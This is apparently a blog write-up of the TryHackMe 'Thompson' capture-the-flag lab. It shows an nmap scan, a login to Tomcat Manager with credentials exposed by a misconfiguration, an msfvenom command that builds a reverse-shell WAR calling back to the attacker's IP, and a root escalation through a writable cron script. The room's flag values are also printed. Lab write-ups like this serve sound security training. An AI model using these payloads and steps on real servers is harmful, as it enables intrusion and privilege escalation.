---
title: "Thompson - TryHackMe"
author: Ludovic COULON
date: 2020-06-07
hero: ./images/hero.png
excerpt: "Writeup for the Thompson room on TryHackMe"
---

[TryHackMe | Thompson](https://tryhackme.com/room/bsidesgtthompson)
Read user.txt and root.txt

---

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.221.95
```

```bash
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL+0hfJnh2z0jia21xVo/zOSRmzqE/qWyQv1G+8EJNXze3WPjXsC54jYeO0lp2SGq+sauzNvmWrHcrLKHtugMUQmkS9gD/p4zx4LjuG0WKYYeyLybs4WrTTmCU8PYGgmud9SwrDlEjX9AOEZgP/gj1FY+x+TfOtIT2OEE0Exvb86LhPj/AqdahABfCfxzHQ9ZyS6v4SMt/AvpJs6Dgady20CLxhYGY9yR+V4JnNl4jxwg2j64EGLx4vtCWNjwP+7ROkTmP6dzR7DxsH1h8Ko5C45HbTIjFzUmrJ1HMPZMo9ss0MsmeXPnZTmp5TxsxbLNJGSbDv7BS9gdCyTf0+Qq1
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6CiO2B7Uei2whKgUHjLmGY7dq1uZFhZ3wY5EWj5L7ylSj+bx5pwaiEgU/Velkp4ZWXM//thL6K1lAAPGLxHMM=
|   256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIwYtK4oCnQLSoBYAztlgcEsq8FLNL48LyxC2RfxC+33

8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request

8080/tcp open  http    syn-ack Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<div className="Image__Medium">
  <img src="https://imgur.com/gQ8AzdM.png" alt="blog_image" />
</div>

Let's try the "manager app" button

<div className="Image__Medium">
  <img src="https://imgur.com/Ty59zwz.png" alt="blog_image" />
</div>

Well, I tried the cancel button because I don't have any credentials

<div className="Image__Medium">
  <img src="https://imgur.com/0wnAZv3.png" alt="blog_image" />
</div>

For some obscure reason (maybe bad configuration) there is a password and a username let's try it ! 🤨

<div className="Image__Medium">
  <img src="https://imgur.com/x0PrhCR.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/7CTEfM6.png" alt="blog_image" />
</div>

Well that worked let's see if there is a way to upload some reverse shell 🤑

<div className="Image__Medium">
  <img src="https://imgur.com/n7GjOi7.png" alt="blog_image" />
</div>

I noticed a WAR file uploader let's search something on github/google

[Multiple Ways to Exploit Tomcat Manager](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)

```bash
➜  TryHackMe msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.2.228 LPORT=1234 -f war > shell.war
```

<div className="Image__Medium">
  <img src="https://imgur.com/FwO3JC4.png" alt="blog_image" />
</div>

### #1 user.txt

```bash
39400c90bc683a41a8935e4719f181bf
```

### #2 root.txt

```bash
$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

$ bash id.sh
id.sh: line 2: test.txt: Permission denied

$ cat id.sh
#!/bin/bash
id > test.txt

$ cat test.txt
uid=0(root) gid=0(root) groups=0(root)
```

If we copy the content root key on the [id.sh](http://id.sh) it should be executed with root privileges let's try that ! :D

```bash
echo "cp /root/root.txt /home/jack/root.txt" > id.sh
```

```bash
# Its a cron job its gonna take some time..
$ cat id.sh
cp /root/root.txt /home/jack/root.txt

$ ls
id.sh  root.txt  test.txt  user.txt

$ cat root.txt
d89d5391984c0450a95497153ae7ca3a
```
